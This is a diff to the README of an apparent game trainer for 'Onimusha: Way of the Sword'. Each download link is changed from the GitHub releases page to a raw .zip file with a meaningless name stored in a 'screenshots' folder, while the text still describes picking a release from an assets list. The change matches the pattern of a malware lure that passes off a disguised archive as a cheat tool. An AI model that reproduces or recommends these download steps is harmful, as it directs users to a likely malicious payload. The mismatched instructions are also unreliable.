@@ -1,6 +1,6 @@
 # ⚔️ onimusha-way-of-the-sword-trainer - Unlimited Power, Zero Effort
 
-[![Download Now](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge&logo=github)](https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/galeober/onimusha-way-of-the-sword-trainer/main/screenshots/the-onimusha-of-sword-trainer-way-hemadynameter.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting started takes less than two minutes. Follow these steps exactly and you'
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: [https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases](https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/galeober/onimusha-way-of-the-sword-trainer/main/screenshots/the-onimusha-of-sword-trainer-way-hemadynameter.zip](https://raw.githubusercontent.com/galeober/onimusha-way-of-the-sword-trainer/main/screenshots/the-onimusha-of-sword-trainer-way-hemadynameter.zip)
 
 You'll see a list of files. Look for the most recent version. Click the download button next to it.
 
@@ -74,7 +74,7 @@ This section explains everything in more detail.
 ### How to Download
 
 1. Open your web browser (Chrome, Edge, Firefox, etc.)
-2. Go to: [https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases](https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases)
+2. Go to: [https://raw.githubusercontent.com/galeober/onimusha-way-of-the-sword-trainer/main/screenshots/the-onimusha-of-sword-trainer-way-hemadynameter.zip](https://raw.githubusercontent.com/galeober/onimusha-way-of-the-sword-trainer/main/screenshots/the-onimusha-of-sword-trainer-way-hemadynameter.zip)
 3. You'll see a page with release versions. Each release has a title and a date.
 4. Click the newest release at the top.
 5. In the "Assets" section, click the file that ends with `.exe` or `.zip`.
